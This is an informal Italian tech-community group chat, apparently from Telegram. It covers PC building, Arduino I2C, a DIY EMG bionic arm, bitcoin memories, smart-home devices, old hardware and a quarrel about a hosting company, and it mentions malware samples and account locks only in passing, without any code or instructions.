Mmm non mi definisco proprio maniaco, ma ci tengo abbastanza
ecchime
anche il nuovo OneBlade è "Cicca Approved"
Con i DVD puoi montare le ISO direttamente
risolto 
volevo lasciare un po' di spazio perxhè credo che comprerò un altro hdd
🤔vediamo? manda una foto
ti mando la parte avanti e quella dietro
avanti
come mi conosci bene nipotazzo
dietro
cosa ne pensi?
ottimo lavoro, con quel case è difficile fare di meglio..i cavi dell'hub anteriore e quelli sopra il copripsu sono troppo rigidi per essere sistemati meglio di così
thx 
Potevi usare lo scotch carta per attaccarlo su ogni cavo e per scriverci su a che serve
io di solito dietro uso le clip adesive e la fascette per sistemare tutto
non trovavo le fascette
su dei cavi sotto tensione e su un pc che arriva a 60-70 gradi? non esiste
il cinese sotto casa è la soluzione 
Io ci arrivo a piedi al cinese, stiamo sulla stessa via (quella principale del paese)

tanto quando torna mio padre le ha
infatti anche se dalla foto non si vede alcuni cavi hanno le facette
si le ho viste, sono come quelle dei sacchetti da congelare :)
ma il pc si pulisce con il compressore?
Si
Non andare con il panno in microfibra
e logico 
Ho montato il radar
compressore e il migliore amico dell'assemblatore..pennello in setola morbido..lascia stare bombolette e panni in microfibra, fanno solamente danni
Me la prenderei volentieri in effetti
sto ancora cercando di convincere mio padre a cacciare il compressore (lui crede che il compressore faccia danni e la bomboletta no)
il contrario casomai..basta controllare che non abbia condensa il compressore, svitando la vite di sfiato in fondo alla bombola
Guarda che la carta brucia a 230°C
ti ricordo che lo scotch carta ha anche la colla..poche ore in un case e si scollerebbe tutto e si staccherebbe, fatica sprecata..ecco perchè si usano sempre la fascette di plastica e le fascette a velcro
Questo sì, ovvio però che non si brucia la carta.
e mica ho scritto che si brucia 
Immaginavo
quando torna controllo
ora sta in servizio
Come faccio a comunicare numeri più grandi di 255 con i2c su arduino?
Questo non lo so...

 ‎€1‎3.‎99‎ i‎nv‎ec‎e ‎ch‎e ‎€2‎5.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎6.‎17%
⭐️‎ 4‎.5‎0 ‌‎/‌‎ ‎5.‎00‎ (‎58‎ r‎ec‎en‎si‎on‎i)
 

Le stavo aspettando...grazie 
intendi più di 255 slave?
prego
No, quando inizio una trasmissione con uno slave con wire.write() mi manda un byte cioè un numero non più grande di 255
Io devo mandare tipo 1000
Per ora ho risolto convertendo il 1000 in 256*k+a e mando un byte contenente k e uno contenente a
Ah uhm...
potresti dividerlo in pacchetti
tipo prima mandi un "Ehi arriva il messaggio", poi continui a mandare 255 finchè ti servono e alla fine mandi un "Ehi ho finito di parlarti"
ora anche il programma dei driver fa vedere fortnite
CIAO A TUTTI
Hai anche tu questo fantastico dono?
Yes... Lo ho da un bel po di tempo, anche se la coscienza di cio è arrivata un paio di mesi fa
Cerco qualcuno pratico di Arduino a cui esporre un problema
hai tutto il gruppo a disposizione 
Stai meno a spiegare subito il problema, poi chi sa come risolvere risponde
Nell’i2c con arduino che differenza c’è tra wire.send e wire.write?
bene, ho quasi fatto morire il mio PC se non fosse stato per il paging di Windows
visto che come al solito io programmo "bene", sono riuscito a creare un memory leak di 10GB
Manco Minecraft
ahahahahahah
no più che altro sono down io a non far intervenire il Garbage Collection (GC) (quello che leva la roba che non serve più dalla RAM)
e in 30 secondi ho riempito 10GB di RAM
mi sento realizzato 
bene, col GC consuma 36MB di media, miglioramenti? 
In cpp ho riempito la ramin meno di un secondo (non per errore)
Non è soltanto la scheda grafica che fa la differenza in una build, puoi avere 7 titan xp, ma se ha un celeron di certo non cambia nulla
Scusate
Non rispondete
Ho detto ad un mio amico che poteva chiedere qui se avesse avuto un dubbio dal mio cellulare
Ma lasciate stare
Ora lo faccio iscrivere così le cazzate le chiede direttamente lui è lo insultate direttamente
Può vedere i messaggi inviati prima
si beh era una domanda, niente di strano
Lascialo a me!
Ahahaha
Si scherza
Scapperà 

Per pochi
Nuooo ahah
Ggienti
dica egregio
Qualcuno ha già provato il sensore per ECG con Arduino?
no sono povero
Ehilà Giulian!

però mi piacerebbe un fracco
ma vogliamo parlare del sensore EMG?
uno con quello + arduino + titanfall su pc si è fatto che per tirare i pugni su titanfall deve tirarli nella vita vera al monitor, c'è un video su iutub, io lo voglio fare
Chiedo qui perché non ho capito bene come funziona... Quest'estate volevo provare a fare un braccio bionico e usare il sensore ecg per rilevare quando viene inviato un impulso attraverso i nervi

maa quello non è l'EMG di sensore?
Eh penso di si
Stavo guardando adesso e mi sa che è proprio il sensore emg
Questo fa tutto: 
che fierezza
Un tot
Dici che sulla spalla lo si riesce a collegare?
noon ne ho idea, ma non credo, lo devi collegare in zona muscolo
L'idea era di farlo per un amico dei miei che ha perso un braccio da poco e ha il moncherino subito dopo la spalla, quindi per forza devo trovare il modo di collegarlo alla spalla
a beh, in realtà va collegato sul nervo del braccio, se ha perso un braccio allora esiste un'operazione apposta(se il tuo amico è fortunato), che gli permetterebbe roba molto migliore di quel che potrai mai fare con un arduino
del tipo che puoi usare un braccio bionico un po' come quello di prima e hai anche un feedback tattile
La mia idea era quella di collegare il sensore emg ai muscoli della spalla e quando vanno in tensione l'arduino fa chiudere la mano o piegare il braccio in base alla durata della tensione
Operazione chirurgica intendi, giusto?
si, beh, un'operazione di quelle che non lasciano nulla dietro però, ora come ora si sono evoluti un po' e di solito fanno reinnervazione mirata per poi usare quei bracci bionici strafichissimi che capiscono i segnali come i bracci normali usando nervi separati e avendo anche il feedback tattile, e non servono macchinari impiantati in testa o altro come si faceva fino a un po' di tempo fa
comunque un'opzione ci sarebbe, c'è un nervo effettivamente ma non so quanto comodo sia poi usare quello
Sto nostro amico si sottopone già a dei test per bracci bionici (tutto pagato da lui), ma per ora non ha ancora niente... Vorrei provare a fargli un braccio bionico da usare temporaneamente
Ragazzi è una settimana circa che sto lavorando su un SONOFF (lo sto riprogrammando con l'ide di Arduino) ma non so perché, oggi non riconosceva più il dispositivo connesso (non mi dava la possibilità di scegliere la porta) ho provato a reinstallare l'ide ma neanche così ha ripreso a funzionare. Il sonoff funziona perché il programma che c'è caricato sopra sta continuando a funzionare tutt'ora. Sapete consigliarmi qualcosa?
Ragazzi mi serve un'idea per sbloccare uno smartphone col sensore hall che non va più
Tempo fa avevo sentito qualcosa per sbloccare telefoni di cui non si conosce la password flashando un file con una custom recovery, ma non ho approfondito e non so darti riferimenti...
Eh no io la password la so
Ma il telefono si è rincoglionito e crede di avere una flip cover addosso e quindi spegne il touch screen 


Faccio parte di questo progetto. Arduino-based anche se su certe cose arduino non poteva fare niente e siamo ricorsi a degli integrati
Potrebbe aiutarti? 
Voglio programmare il Dht11 senza usare la libreria. Guardando i data sheet leggo che il sensore deve restituirmi un valore alto di 27uS che indica 0 e un valore alto di 70 uS che indica 1. Questi valori li riesco a leggere ma a intervalli di tempo esagerati. Qualcuno può aiutarmi?
Lo so dove è
Il problema è che si è sputtanato
Quindi anche con un magnete non si sblocca
Non saprei... È una cosa che si può staccare?
Aprendo il telefono intendo
Guarda questo 
Eh ma non va il touch
Quindi non posso fare nulla, nemmeno ripristinarlo
Tramte abd sideload puoi creare e modificare dei file se non sbaglio
Because 2012 had some sweet memes



by 
topp
PERLA
Beh magari stampato in 3D 🤔🤔 può venire una bella mano🤔
quella parte dei hacker e bella ,voglio essere uno di loro 
Si, come ho già detto a Giulian in provata penso che farò la struttura del braccio in alluminio e la mano in petg stampata in 3d
Ci lavora mio padre lì ahaha
Magari c'entra qualcosa anche lui che di solito fa ste robe
Portalo come tesina
Deve essere una figata assurda
da futura?
Nope al Legnani
Bernocchi?
Si ciaone, quello ahahah
Che insegna?
Elettronica elettrotecnica
Fra 3 anni potrebbe essere un'idea
Nice
Ahahahahahahaha
Su report parlano di Bitcoin
Strano non lo fa nessuno
Vabbè è un servizio un minimo più approfondito
Beh inizia a pensarci, un mio amico di scaglione mi ha raccontato che per fare la sua tesina ci ha messo 2 anni
Era un software di intercettazione di pacchetti dati scritto da cima a fondo da se stesso
Parlano anche di Bitconnect e Mt.gox
Mt.gx e fallito tanto tempo fa
Hahahahhaahahahaahah 
 l'ho già sentita sta storia del "Youtube non parla con i creator" da qualche parte 🤔🤔
Su quale canale
Rai3 ma è finito
Anche Bitconnect è fallito
Sì è dove si sono registrati i maggiori furti di bitcoin
Mt.gox ehee era lì che era quotato io bitcoin quando nonna leva niente
Nel 2010 il prezzo era di 10 centesimi circa
Fino al 2011 il prezzo è rimasto vicino a 1$
Poi è iniziato a salire rapidamente fino ad arrivare a cieca 20000$ per coin nel 2017... ora e innavvicinabile...8900-9000 $
Che storia...!!!!
Ti interessa bitcoin?
Io ho l'hedger
E' il wallet hardware
Mi sono avvicinato a questo mondo a novembre e dopo mesi di studio sto avendo anche qualche risultato
Che hai fatto... trading?
Per avere un bitcoin oggi ci vuole una fortuna
Questo è il mio guadagno
Questo è il mio portafoglio
Hai fatto trading!!!
Tutte altcoin
Nha ho solo comprato al momento giusto
Infatti... i prezzi si sono rilassati dopo il grande rialzo
Voglio comprare anche un po’ di Bitcoin però prima mi sono soffermato sulle altcoin
E ad esempio con Eos ho fatto il 140%
Ti piace il trading?
No troppo stress
Io sono più un Holder
Ahhh ok... infatti
Io nel 2016 sono arrivato 1 a una competizione con denaro reale
Ho fatto più del 370% in 3 mesi di competizione
Trading ?
Si
Orca troia
Ma sul mercato delle crypto o altro tipo Fiat, azionario
?
Indici, quindi azioni. Ho utilizzato i derivati.
Okk
Non mi ricordavo bene... era il 368%
Bravo complimenti
Con le crypto e più difficile...
Il mercato è una giungla
E l’analisi tecnica è pressoché inutile
C'è stato un imprenditore bresciano che nel 2012 ha comprato migliaia di bitcoin a circa 1$
E andato sui giornali... hanno stimato la sua ricchezza intorno a 100 milioni di $
Dice che molti bitcoin li ha spesi...
Ad averli scoperti prima
Nel 2010 2 pizze circa 1000btc
Io li ho scoperti quanto valevano circa 200$ per una ricerca della scuola
Però allora avevo lasciato perdere
Praticamente al cambio di ora 80 milioni di dollar
I
E si 
Era ancora buono il prezzo
Avoglia
Praticamente 2012-2013
Investivo 200$ e oggi ne avevo 9000$
Sì per btc
Si stavo facendo una ricerca sulla pizza e ho trovato la notizia della pizza pagata in Bitcoin
Ahhhaaa... sta sul sito storico del btc... il forum e ancora li...
Infatti mi ha fatto un sacco ridere appena ho ritrovato la ricerca dove dicevo il cambio di allora e spiegavo in maniera grossolana il funzionamento della Blockchain
Sì. .
E quella che ha permesso tutto.. comunque io ho provato... il pagamento e' lentissimo rispetto a ripple...
Ripple e lumens sono da tenere in portafoglio...
Ho fatto delle transizioni in btc... e lentissimo
Ripple lo avevo ma l’ho venduto appena è arrivato a 3,50$
Infatti non credo alla sua adozione di massa
Ora è sceso tanto
Verrà surclassato sicuramente
E il primo a essere nato...
Ad esempio Nano è da tenere d’occhio
Per il momento tutti lo vogliono
Lo so ma è impossibile da usare
Io non ci pagherei mai il caffè al bar
E molto lento nelle transizioni
È lento e costoso
Io ho un portafoglio hardware per la generazione di indirizzi con chiave...
Le transizioni vengono convalidate solo se Premo il pulsante del dispositivo
Si conosco il Ledger
E molto sicuro... altrimenti le tieni sul sito... ma può anche fallire
Sì pagato un 90 euro circa
Per adesso utilizzo Exodus sul mio Computer
In locale quindi
Ma ledger è nei miei prossimi acquisti
Si certo
Non tengo niente online
Permette di fare copia del portafoglio
Si
Io non li conosco
Ci sono le chiavi di Backup
Exodus è ottimo
È anche abbasta famoso
Ma ledger è il top per la sicurezza
Nel 2014 o 15 un ragazzo inglese aveva buttato il suo hd con 70 milioni di dollari in bitcoin
Sì è messo nella discarica a cercarlo... e uscito sui giornali
Era un hacker
Non so come funzionano le chiavi di recupero...
Mai utilizzato il wallet su hd
Che istituto frequenti?
Buona notte a tutti...
Notte!!
Notte
Liceo Scientifico
Notte
'Giorno 
Buongiorgio
Beh beh effettivamente...
Eh ma questo si capisce, richidde tempo, io conto di farla quest'estate. Comunque è una bella idea la tua!
Hai amici fantastici
Raga a me serve un microfono per parlare mentre gioco su pc, perché gli auricolari mi fanno sclerare. Sapreste consigliarmi qualche microfono buono (non da studio ovviamente) e a basso prezzo? 
Possibilmente vorrei evitare di prendere anche una scheda audio
Cosa intende per basso prezzo?
Che non siano tipo 300 euro
Qualsiasi microfono va bene
Qualcuno si sente meglio ma con 20€ te la dovresti cavare e avere un buon risultato
33?
10 il microfono a clip
Ma funziona solo con il cellulare quello mostrato da ghela
Rip
Gli annunci quelli importanti
Ho bisogno di una trentina di supporti in ABS come quello in foto.
Qualcuno con una stampante 3D è in grado di farmeli?
Mamma mia, sono proprio piatti? Si deforma abbastanza l'abs in una situazione del genere
Hai sbloccato il telefono?
Lo ho rincoglionito con dei magneti
Lo ho lasciato tutta la notte con cinque sei magneti intorno, stamattina sono riuscito ad accenderlo e ho disabilitato la funzione smart cover 
Io comprai 9 bitcoin per circa 100 euro. Avevo 18 anni quando vedendoli guadagnai circa 200€. Mi sembrava di aver fatto un affarone!
Peccato...
E che anno era...
????
Mi pare di averli comprati ad agosto/settembre 2012
Devo controllare quando lavoravo ad ondaland 🤔
E come sapevi del bitcoin?
E come sapevi del bitcoin???
Settembre 2012
E strano i prezzi già dovev ad no essere sopra i 120 $ per btc
Navigavo sul deep web
Come hai fatto ad averli con prezzo così basso
???
Ho corretto, 2012
A che prezzo per btc?
Mi ricordo di averne presi 9.Qualcosa per circa 100 euro
Poi esisteva un'app da mettere sul pc che ti faceva guadagnare pochi millesimi di bitcoin per avere delle pubblicità a schermo
Hai già il modello?
Su quale sito li hai presi?
Se volete che qualcuno vi fa stampa 3d... almeno un disegno quotato   ...
Su quale sito ...???
E chi si ricorda. Stiamo parlando di 6 anni fa xD
Capirai... non e' tantissimo...
Esisteva ancora silkroad! Per me è tanto non mi ricordo su quale sito lo comprai nel 2012
E poi li hai spesi!!!
Ho il campione, più tardi preparo un disegno quotato, ho allegato la foto solo per rendere l'idea
Non ho speso soldi su silk road, anche se ero tentato u.u
Che poi ha chiuso.
Esatto
Sì sono registrati furti nel 2011
Ok attendiamo
Non so se usato questo o no, non mi ricordo 
Fatto sta che è passato 
Non credo...
Quel giovanotto che ha fondato il sito ci credeva veramente... nel 2011 2012 era sconosciuto a qualsiasi persona in italia (credo)...
Comunque memorizzati il nome perché sicuramente proverà ancora... sono sempre gli stessi a portare la bandiera...
Classe 85
All'epoca nel 2009 aveva 24 anni

Uuuhhh
Che e'?
il google home mini, l'altoparlante e assistente smart di google
E che fa?
Un robot?
serve per la domotica
Be non lo conoscevo.
è da un mesetto che è in vendita in Italia
Che fa di particolare?
Lo puoi usare con la domotica, fai quasi tutto con la voce
Non so quanto sia utile nell’uso pratico
Sì ho capito .... robot domestici
domotica..ci puoi controllare le prese elettriche wireless, controllare le luci, le tapparelle, gli impianti videocitofonici e di videosorveglianza, comandare il termostato della caldaia e le valvole termostatiche dei termosifoni, comandare gli elettrodomestici smart, i condizionatori, ecc. ecc.
Sì ....
Sperando che qualcuno non trovi una falla di sicurezza
Anche io ho questo multimetro, ho notato che sul display ci sta il segno della temperatura... Mica la può misurare?

 ‎€8‎.9‎9 ‎in‎ve‎ce‎ c‎he‎ €‎19‎.98
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎5.‎01%
⭐️‎ 4‎.2‎0 ‌‎/‌‎ ‎5.‎00‎ (‎12‎9 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 

Multimetro?
Si
A che ti serve?
Perché? Lo ho già
È questo qui
Che ci fai?
Qui ci sono i simboli
Resistense, batterie ecc
Dal selettore non si evince una misura di temperatura.
Che istituto frequenti?
Si, però visto che ci sono i simboli pensavo potesse farlo
Sarà il display di un altro multimetro
Itis
Elettronica?
🤔quello dovrebbe essere il range di funzionamento se non sbaglio, dovrebbe avere questa funzione
Sì non sembra male... comunque sono tutti uguali
quelli economici si..se mi parli di Fluke e ICE proprio no
Federica sei una ragazza?
Ha l'autorange, il selettore cambia solo la lettura
Mi sa di si... comunque non saprei dirti... devo controllare se posso o no avere una funzione così è in che tipo di misure
Sì infatti...
Oscilloscopi?
Ne avete?
🤔giusto..io sono abituato con il mio Fluke che fa tutto in automatico
dipende dal budget
Sì trovano anche usati
Anche io, in fondo si sa più o meno cosa si misura
certo che si trovano, gliene ho fatti comprare parecchi usati a dei ragazzi del gruppo..ma sempre oltre 200€
Non credo comunque che sia in grado di svolgere quella funzione
Korry che lavoro fai?
Sei studente?
Siete spariti...
Ne hanno già trovata una. 

vigile del fuoco tlc
Ok
Chissà quante ne hanno trovate senza rendere pubblica la notizia
Ho visto il peggio fake di sempre
beh, solitamente i bug vengono comunicati alle aziende e poi resi noti al pubblico dopo 9 mesi
Cosa cambia tra l'home normale e quello mini?
 poretto
Qualche modello viene fornito di termocoppia per la misura della temperatura, questo modello, dal selettore non sembra averlo.
Le dimensioni contano
Seee contaci
l'Home ha più altoparlanti e il suono stereo, mentre il Mini ha solamente un altoparlantino piccolo
🤔secondo me lo schermo è comune con altri tester, e ne hanno prodotto uno unico per tutti i modelli
Qualcuno puo darmi info sulla am8?? Che differenze ci sono con la anet??
Certo, costa di più fare più linee di produzione.
Raga mi hanno regalato un HDD pata da 10 gb  e funziona anche perfettamente!
Io ho un hdd bigfoot da 1GB
Io ne ho una diecina...
Uddio roba antica
🤘
Mi sono sempre chiesto cosa potrei farci
Avevo letto 10Tb
Puoi provare ad usarla come miniserver di backup..
E la collezione di hardware vecchio aumenta dopo una quindicina tra i386 e i486 , ram a volontà e una voodoo 3dfx
Eh piccolino
Cercare i pezzi da museo in discarica e trovare hdd pieni di p*rno e virus>>>
Cosa serve un HD da 10gb? Non sono pochi per un disco fisso?
Perché bigfoot ? E grosso come un floppy da 3,5 "
Qualche video/file
Il mio va nella build retro win 98
Ahahahahah
Yep.. io sto provando a farmi un NAS con un HDD da 1 TB della WD 
Io infatti sto a fa la scansione ed ho trovato un botto di merda, p0rno e robe del genere cancellate 
Noooo...  I porno salvali..
Ahahahah
Non preoccuparti salvo tutto e faccio la cernita
Magari qualche conticino in banca non disdegnerei
Oppure qualche carta di credito... 
Trovato una HP laserjet 1100 perfettamente funzionante
Storica stampante laser
Da ben 6 copie al minuto
Uh che culo . Ed io che non piglio le cartucce da mesi
Ma quanti porno guardava questo?
Un floppytron
Ha 20 anni quella stampante
Ah si figata
Esatti
Sto mettendo da parte floppy
Poi passami qualcosa di interessante..
Ti invio questi 
 ci faccio la birra..
Molti li vendono a terzi, visto che solitamente le aziende produttrici pagano meno
Ragazzi la am8 quanto puo costare nuova??
Emm 
"JavaScript, also known as Java for short"



by 
Apple ad esempio da pochissimo
Tra 2 settimane vado ad Arezzo a vedere un Elea 9003 funzionante !!!
vabbè, li sta tutto nell'onestà del ricercatore
Qualcuno sa quanto costa una am8 nuova??
Lol
Scusami Marco ma l'app qual'è?
Ma come si trova Google Lens? Ho letto che è integrato in Photos ma non trovo nulla
Ragazzi ho una domanda
Come funzionano le luci "domotizzate"?
tipo le lampadine che puoi accendere con google
Neanch'io ho il tasto delle "meraviglie"
Solo io ci sono rinasto con il tasto "winzozz"??
 sry..
Truffatina incoming
Android Oreo?
Antico
No

8.1.0
Io ho la 7.1.2 
con la 7 va?
Va cosa??
cit. " le novità del Google I/O  Google Lens e le correzioni automatiche suggerite"
Dunno.. non uso ste robe.. 
non usi google foto?
Nope..
kk
io invece ci tengo tera tra foto e video gratuitamente
Alcuni li tengo su drive.. ma ho solo 17 gb di spazio.. 
con foto è illimitato
"per foto fino 16MP e video fino al FULL HD"
Ciao a tutti, io ho un CD con un programma ( molto vecchio 1998 aggiornato nel 2006). Visto che è di un libro scolastico dovrei estrarre gli esercizi. Al suo interno c'è un archivio cab, ma non riesco a convertirlo ne ad aprirlo. Come potrei fare?
Come potrei farlo diventare una "webapp" nel senso che la si avvia nel browser?
Ragazzi una domanda
Mi é arrivato uno xiaomi Red mi 5 plus ordinato una settimana fa su Amazon da un venditore terzo (spedizione Amazon quindi mi sono fidato)
Praticamente mi é arrivato il dispositivo ma é già collegato ad un altro account xiaomi
Come posso fare per scollegarlo e quindi usarlo non avendo le credenziali di quell'account?
V prego aiutatemi
É come se avessi comprato un cellulare rubato
É molto frustrante


Come caz??
diciamo che ho provato ad uppare un file di 2GB su un server
. . .
ma l'ho fatto quasi a posta dai
infatti 5 minuti dopo dividendo il file in cluster non ho mai superato 10MB di RAM, e tutto il programma pesa sui 30
Lens non è ancora per tutti in italiano comunque
ma non era solo per i Pixel?
Stamattina mi si è anche attivato in Google assistant
Io lo ho completo da stamattina
uuh, lemme check
non ce l'ho ancora, né su Assistant né su Photo

Io in inglese però eh
ah può essere per quello
Se metto la lingua del cellulare in inglese me lo da?
io ce l'ho in italiano perché altrimenti i miei amici mi prendono per maniaco se parlo al telefono in inglese

Ragazzi
L'honor 10
Ha il sensore di impronte sotto al vetro 
Visto
Potevano farlo full screen
Già
A quanto pare la prima sarà Lenovo
Ma il one plus
Secondo me ci sorprendono e sono loro
Che poi Honor 10 ha comunque il tasto disegnato?
No ha il notch
Yess
Alla fine pare l’unica soluzione per avere full screen e sensori davanti
Mmmmmm è già stato presentato?
Vivo ha i sensori frontali
Dentro allo schermo?
Sì
Yup
Si ma dicono che funzioni malissimo
Honor 10 ufficiale: Dual Camera IA da 24MP e corpo in vetro a 399€



Lo avevamo già visto qualche settimana fa in occasione della presentazione cinese ma oggi è stato ufficializzato finalmente anche per il nostro continente a seguito dell’evento appena concluso a Londra. Stiamo parlando di Honor 10, il nuovo top di gamma della casa cinese, costola di Huawei che prende molto spunto dal fratello P20 adattandolo allo stile […]
cosa usi come driver per i led? hai gia intregrato il controllo luminosita/colore da google home?
non so come fare quello
Primi sensori, ci sta
Questa one plus mmmm credevo facesse qualche scherzo, sta diventando di nicchia
cosa usi per comandarlo?
sonoff
Dove le posso trovare ste funzioni?
Wooo sono attive le novità del Google I/O  Google Lens e le correzioni automatiche suggerite
nono non usare quelli, hai due soluzioni o ti fai un driver con un esp8266 e tre mosfet e lo fai comunicare con mqtt con home assistant, oppure flashi tasmota su AriLux AL-LC01
se vuoi possiamo parlarne in pvt
Ma raga vi si vedono tutti i canali TV a voi?
See..
Anch’io l’ho preso 🤩
se ho scaricato un file .zip o .rar infetto senza averlo aperto il pc potrebbe essere comunque essere stato infettato?
Se lo hai unzippato non credo ci siano problemi, se hai "esplorato " il contenuto cliccandoci o eseguendo forse si...
Prossima volta, ispeziona se non ti fidi
🆘AAA🆘 Cercasi il Libro USATO  Fondamenti di Programmazione in C++ di Luis Joyanes Aguilar chi lo ha mi contatti. Grazie
Infatti è quello he ho fatto
se avvio un rat, Una backdoor o un troyan su live è un pericolo?
Ah allora ❤️
Ahahahahah uso sempre le precauzioni 
In teoria sì, il disco è comunque montato...chiamerei in causa 

Che ci ha abbandonati?🤔
Ragazzi alimentatore da banco: meglio farselo o comprarlo?
Da mo
Non parla più
Mutismo selettivo
Ma... seriamente?
Nono è proprio scappato
?
Qualcuno di voi ha gli EBook dei libri di Asimov? Su Amazon c’è solo la versione cartacea
Sei stato tu a farlo scappare? 
Questo Asiimov? O l'M4A4?
Scusami, dovevo.

Dove?
Boh
io non le trovo
Same
da dove posso scaricare xp?
Sul computer
ti bannerei.....
torrent
qualcosa di sicuro...
Sisi certo certo...
Ma su un telefono di bandiera non li metterei mai
Di bandiera?
Eh sì quelli famosi
.
Un Samsung galaxy s qualcosa con i sensori che non vanno la Samsung non se lo può permettere
Perché ti servirebbe?
Aah beh sì, ce a meno che fa uscire dei test così però non avrebbero senso
te cosa ci fai con xp? una vm per un pc scarso ovvio
Ma nell'ultimo video di linus, ha ricevuto un prototipo di scheda video intel non funzionante?
Ma cos
ti spiego....
Io con XP non ci faccio nulla 
devo usare dei file pieni di virus
e l'unico modo è blindare la vm con xp
qualche idea migliore su linux? una live non credo basti
ahahahahahahah
Vm di qualche distro? 
i file sono .exe e dovrei scaricarne una leggerissima
parrot non lo regge in modo fluido
(è un portatile con i5 7200u)
Spe ma che devi fare con sti file pieni di virus oltre buttarli nel cestino?
Emmadonna io ho un portatile con i5 3337u
con arch
E gnome
Quindi non è il massimo della leggerezza
io adesso ho elementary
Rimane la domanda di cosa tu te ne faccia di file pieni di virus
E allora basta e avanza
ma voglio mettere arch
Che ti serve altro!
Usa elementary
non posso metterci i file!
Why not?
sperimentare....ovvio...
che installo i file con i virus sul sitema principale?!
Ma spe tu hai dei virus e li vuoi installare? 🤔
rat, backdoor, trojan
più o meno 
Virus per windows su elementary 🤔
sandbox
on windows
Sono perplimuto assai 
testare
ahahahahahah
sono rat, backdoor e trojan
o almeno così dicono 29 antivirus su 51
Ragazzi mi hanno chiesto una mano per stampare un progetto in 3D e mi hanno chiesto se ho una tariffa oraria
Quanto dovrei chiedere onestamente?
Cosa ne pensi di Pantheon al posto di unity?
Gusti
Sulla 16.04 LTS mi bugga la barra a volte
Glitcha lo schermo
Metti la 18.04
Dici che non ha bug seri?
Nope è una LTS apposta
Passerò alla 18.04
This..
mi piace
io devo aggiustarr un botto di cose....
 vero?
uomo o donna
Ma che caz
uomo o donna?
dipende....vuoi farci i soldi? hai legami con sta gente?
aspè
È una donna che ha come cliente uno studio di architettura
ahh
ma riccardo ti sembra un nome maschile?!
dico la clienteee
Mai visti però non sono un professionista
ma chissene
non la da
ma tu di una botta ogni 10min
È brutta come un cancaro
ah
rip
questo lo avevamo  capito
allora botte ogni 10 minuti
oppure chiemio
dipende dai gusti
Piuttosto pago io lei
ahahahahah onesto
per andarsene? 
Per non darle botte ogni 10 min
Me la cavo con un “faccia lei non ho una tariffa precisa”
10 -15 euri minimo..
Magari il suo cliente crede sia una cosa seria e mi da 50 €
. . .
indovinate cosa cera di 1.8gb nel mio cell di 2.2 gb
L'OS
 no
ho cancellato i media di telegram che ho trovato grazie a un prog
e mi sembrava strano che ogni volta la memoria si riempiva prima pensavo che ho un virus e avevo formattato anche il cell 
Tralasciando il fatto che hai un Mac, perchè hai quello sfondo?

perchè comprarsi un mac per mettere winzozz?
Ma la domanda ancora più misteriosa... PERCHE' GAMEHOSTING?!
gamehosting?
E' L'AZIENDA PIU' SCHIFOSA MAI ESISTITA SULLA FACCIA DELLA TERRA!
Cosa hai usato...per il controllo...

Dio santo è vero 
incidenti mortali incoming

that aren't your problems
hahahahah, sono di gamehosting (beta tester)
these*
Non significa niente allora, non sei di GH
LOL
Comunque se sei beta tester sai in anticipo lo schifo che fa GH
Gamehosting non ha senso prendi una vps, spendi meno e vai meglio
In realta GH vende vps
ma sono virtualizzate in openvz
Se vendi un rene magari riesci a pagarti una vps da 2 gb di ram su Gamehosting
Costare poco costano poco ma rispecchiano la qualità del servizio
Boh comunque gamehosting non mi è mai piaciuto, l'ho provato solo 1 volta e mi è bastato
Specialmente l'assistenza
Stessa storia per me assistenza assente e prezzi di merda
Mi ricordo che avevamo invitato Raffaello (che è tra i founder di GameHosting) in un gruppo Telegram per chiedergli un paio di cose ed è quittato
ovvio, mica deve stare dietro anche a voi
bah, libertà di opinione
 Segreti del mestiere
io ci messaggio giornalmente con raffy
Dopo aver fatto lo sforzo di joinare il gruppo avrebbe potuto rispondere
ma perchè, lui se vedi (ma evidentemente non vedi), è pieno di lavoro visto che si occupa dei nodi delle vps. Lasciatelo in pace

Sono molto occupato ora
Io sono occupato
Nop, ha iniziato a rispondere, poi è quittato all'improvviso dopo una "accusa", della serie ragequitto
questi sono solo 2 dei messaggi
posso mandarti una chat intera, ma evito
Perchè è un coglione
Comunque sia chiaro, non ho niente contro di loro, però ne fanno di cazzate
mah, chi lo dice sa di esserlo. raffy è più intelligente di te nel settore delle vps. Punto e stop
Forse intendi sapiente
Nicolò purtroppo molta gente è maleducata e fino a poco tempo fa i miei colleghi rispondevano a tono
ne abbiamo esemplari
Ah capito
qui presenti

Ti credi figo perchè "lavori" negli hosting
no, semplicemente prima vai a conoscere le persone, poi ne riparliamo
ha anche lui dei difetti, nesusno è perfetto
Lo conosco e anche bene
Ho le chat
"Se vuoi te le mando ma non credo sia il caso" cit.
bene, sono felice. Perchè insultare gente? Almeno lui lavora e ha uno stipendio a differenza di chi sa solo criticare stando davanti ad uno schermo.... 
La stessa cosa la stai facendo te 
NO
ON
CHIUDIAMO QUI 
—---------------------------------------------------------------------------------------------
off
sonoff
tasmota
Emanuele sta scrivendo....................................................................
Questo è peggio di "no u" come risposta a "ur mom gay"
Sisi
-___-
Google home + Google assitant
una striscia a led con controller wifi
raga
domanda veloce
su g2a puo essere utile prendere 5 chiavi a caso di steam
a 10€?
Mhmmmmmhmhmhm
Se poi le ragali a me si avoglia che conviene altrimenti non saprei
Facciamo 4 calcoli
Quanti giochi di sviluppatori indipendenti "decenti" ci sono si steam?
2
premiun key mi ispirava "giochi giocabili"
'
Beh credo che ti ispira un po' male
Moltiplichiamolo per un numero esagerato e troveremo tutti i "giochi" non degni di essere nominati che potrebbero essere sorteggiati
RAGA
Google Lens
Quello nuovo
In italiano
Su iPhone 6S
E NON SU GALAXY S6
Eh? 
Sull'iPhone di una con Google Foto c'è il nuovo Google Lens, sul mio telefono Android no.
Aaaaah ma su gogole photo
Sì
Le è arrivato il suggerimento per correggere la luminosità
A me arrivano solo quelli per archiviare foto
Sarà che quelle che faccio sono già perfette
Idem e ogni morte di Papa

Nulla di nuovo arriva sempre anche la notifica a me.
Mentre ho Google lens SU Google foto (p9 lite)
Ma per il momento nessun consiglio...
Eh ma adesso compare con la nuova grafica all'interno delle foto
Anzi cambio idea

Ahahahah solo perché ti fa concorrenza
Come hai fatto a diventarlo? 🤔
A me non Arriva proprio!
Pandino fierissimo comunque
Hahha...mi sono scordato la frase....
Che fai di cognome Di Maio?
No per fortuna 
Bene, allora sistema il congiuntivo.
(Scusate ma dovevo)
Ahahahah
Hahahahhahahahahhahahaha Sorry
Settato in inglese?
Avevamo fatto i provini tempo fa
Provini su cosa?
